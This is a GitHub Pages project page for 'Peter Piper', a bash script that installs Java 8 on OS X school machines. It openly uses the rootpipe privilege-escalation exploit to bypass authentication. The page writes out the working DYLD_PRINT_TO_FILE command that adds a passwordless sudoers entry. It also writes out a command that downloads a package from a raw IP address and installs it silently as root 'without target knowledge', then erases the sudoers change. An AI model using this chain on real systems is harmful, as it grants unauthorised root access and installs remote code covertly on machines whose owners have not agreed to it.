<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link href='https://fonts.googleapis.com/css?family=Architects+Daughter' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
    <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
    <link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print">

    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title>Peter Piper by MA-C</title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1>Peter Piper</h1>
        <h2>A simple Java 8 updater (bash script) for OS X made for Madison Academy. Makes use of the rootpipe exploit.</h2>
        <a href="https://github.com/MA-C/Peter-Piper" class="button"><small>View project on</small> GitHub</a>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">
          <h1>
<a id="peter-piper-documentation" class="anchor" href="#peter-piper-documentation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Peter Piper Documentation</h1>

<p><strong>1. INTRODUCTION</strong>
<br>
This script was made as an alternative to legitimate authentication in Applescript. This script uses a method of exploitation in OS X called root piping.</p>

<p><br></p>

<p><strong>2. EXPLOIT</strong>
<br>
This exploit uses a vulnerability that was properly fixed in OS X 10.10.5. Itâ€™s reference information is <a href="https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html">here</a>.
This exploit gives whatever user that executes it admin instantly.</p>

<p><br></p>

<p><strong>3. INSTALL</strong>
<br>
We use <code>cURL</code> to get the Java 8 Update 60 package (.tar archive) onto the target computer and into a temporary directory, decompress it, and then use the <code>installer</code> command featured in the OS X command line to install the .pkg we fetched. This is the correct command for this particular task because it skips the graphical installer meaning it can run behind the scenes without target knowledge.</p>

<p><br></p>

<p><strong>4. CLEANUP</strong>
<br>
We first remove the temporary directory used to store the Java package during install, then we use the command <code>sed</code> to remove the target from the sudoers list.</p>

<p><br></p>

<p><strong>5. <code>function KeepSafe { }</code> &amp; <code>trap</code></strong>
<br>
This is used to ensure the completion of the command if it fails.</p>

<p><br></p>

<p><br></p>

<h2>
<a id="in-depth-look-at-function-keepsafe---commands" class="anchor" href="#in-depth-look-at-function-keepsafe---commands" aria-hidden="true"><span class="octicon octicon-link"></span></a>IN-DEPTH LOOK AT <code>function KeepSafe { }</code> COMMANDS</h2>

<p><code>echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" &gt;&amp;3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;</code> <strong><em>- Exploit the machine</em></strong>
<br>
<code>sudo bash -c</code> <strong><em>- Create a root bash shell</em></strong>
<br>
<code>if [[ $EUID -ne 0 ]]; then echo -e "\033[1mFailed! No root!\033[0m $(exit 1)";</code> <strong><em>- Check if the exploit actually worked, if not, exit the script</em></strong>
<br>
<code>sudo mkdir -v /tmp$$;</code> <strong><em>- Make a temporary directory to store the package in</em></strong>
<br>
<code>sudo curl -# http://24.96.42.83/ownCloud/index.php/s/MipN60plXKZ21vg/download &gt; /tmp$$/Java8Update60.pkg.tar;</code> <strong><em>- Get the package (.tar archive)</em></strong>
<br>
<code>tar -xfv /tmp$$/Java8Update60.pkg.tar;</code> <strong><em>- Unpack the .tar archive</em></strong>
<br>
<code>sudo installer -verbose -pkg /tmp$$/Java8Update60.pkg -target LocalSystem;</code> - <strong><em>Install the package</em></strong>
<br>
<code>sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers;</code> <strong><em>- Remove the line allowing root access without a password</em></strong>
<br>
<code>rm -rfv /tmp$$;</code> <strong><em>- Remove the temporary directory</em></strong></p>
        </section>

        <aside id="sidebar">
          <a href="https://github.com/MA-C/Peter-Piper/zipball/master" class="button">
            <small>Download</small>
            .zip file
          </a>
          <a href="https://github.com/MA-C/Peter-Piper/tarball/master" class="button">
            <small>Download</small>
            .tar.gz file
          </a>

          <p class="repo-owner"><a href="https://github.com/MA-C/Peter-Piper"></a> is maintained by <a href="https://github.com/MA-C">MA-C</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
        </aside>
      </div>
    </div>

  
  </body>
</html>
